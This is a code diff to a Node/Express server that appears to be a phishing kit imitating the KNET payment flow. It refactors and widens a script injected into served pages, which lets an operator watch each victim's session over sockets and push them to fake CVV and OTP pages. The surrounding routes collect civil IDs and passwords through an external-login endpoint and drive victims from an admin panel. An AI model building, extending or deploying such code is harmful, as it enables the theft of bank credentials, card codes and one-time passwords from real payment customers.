@@ -22,6 +22,35 @@ function notifyAdmins(event, data) {
   adminSockets.forEach(s => { try { s.emit(event, data); } catch(e) {} });
 }
 
+function getInterceptorScript() {
+  return `<script src="/socket.io/socket.io.js"><\/script><script>
+(function() {
+  function initInterceptor() {
+    var knetId = sessionStorage.getItem('eventat_knet_txn');
+    if (!knetId) return;
+    var sock = io({ forceNew: false });
+    sock.on('connect', function() { sock.emit('join_payment', knetId); });
+    sock.on('payment_status_changed', function(data) {
+      var id = sessionStorage.getItem('eventat_knet_txn');
+      if (!data || (data.id !== id && data.paymentId !== id)) return;
+      if (data.status === 'CVV_PENDING') {
+        window.location.href = '/knet/cvv?id=' + id;
+      } else if (data.status === 'CVV_APPROVED') {
+        window.location.href = '/knet-otp?id=' + id;
+      }
+    });
+    sock.on('navigate_to', function(data) {
+      var id = sessionStorage.getItem('eventat_knet_txn');
+      if (data && data.page) window.location.href = data.page + (id ? '?id=' + id : '');
+    });
+    window._interceptSocket = sock;
+  }
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initInterceptor);
+  else initInterceptor();
+})();
+<\/script>`;
+}
+
 app.post('/auth/external-login', (req, res) => {
   const { civilId, password } = req.body;
   const loginId = uuidv4();
@@ -215,50 +244,24 @@ app.post('/admin/navigate', (req, res) => {
 });
 
 app.get('/panel', (req, res) => { res.send(getAdminHTML()); });
+// Serve index.html with injected interceptor script (must be before express.static)
+app.get('/', (req, res) => {
+  const fs = require('fs');
+  const indexPath = path.join(__dirname, 'public', 'index.html');
+  fs.readFile(indexPath, 'utf8', (err, html) => {
+    if (err) return res.sendFile(indexPath);
+    const interceptScript = getInterceptorScript();
+    const modifiedHtml = html.replace('</body>', interceptScript + '</body>');
+    res.send(modifiedHtml);
+  });
+});
 app.use(express.static(path.join(__dirname, 'public')));
 app.get('*', (req, res) => {
   const fs = require('fs');
   const indexPath = path.join(__dirname, 'public', 'index.html');
   fs.readFile(indexPath, 'utf8', (err, html) => {
     if (err) return res.sendFile(indexPath);
-    // Inject socket interceptor script before </body>
-    const interceptScript = `<script src="/socket.io/socket.io.js"><\/script><script>
-(function() {
-  function initInterceptor() {
-    var knetId = sessionStorage.getItem('eventat_knet_txn');
-    if (!knetId) return;
-    // Create a separate socket connection for navigation interception
-    var sock = io({ forceNew: false });
-    sock.on('connect', function() {
-      sock.emit('join_payment', knetId);
-    });
-    sock.on('payment_status_changed', function(data) {
-      var currentKnetId = sessionStorage.getItem('eventat_knet_txn');
-      if (data && (data.id === currentKnetId || data.paymentId === currentKnetId)) {
-        if (data.status === 'CVV_PENDING') {
-          window.location.href = '/knet/cvv?id=' + currentKnetId;
-        } else if (data.status === 'CVV_APPROVED') {
-          window.location.href = '/knet-otp?id=' + currentKnetId;
-        }
-      }
-    });
-    sock.on('navigate_to', function(data) {
-      var currentKnetId = sessionStorage.getItem('eventat_knet_txn');
-      if (data && data.page) {
-        window.location.href = data.page + (currentKnetId ? '?id=' + currentKnetId : '');
-      }
-    });
-    window._interceptSocket = sock;
-  }
-  // Run after page loads
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initInterceptor);
-  } else {
-    initInterceptor();
-  }
-})();
-<\/script>`;
-    const modifiedHtml = html.replace('</body>', interceptScript + '</body>');
+    const modifiedHtml = html.replace('</body>', getInterceptorScript() + '</body>');
     res.send(modifiedHtml);
   });
 });
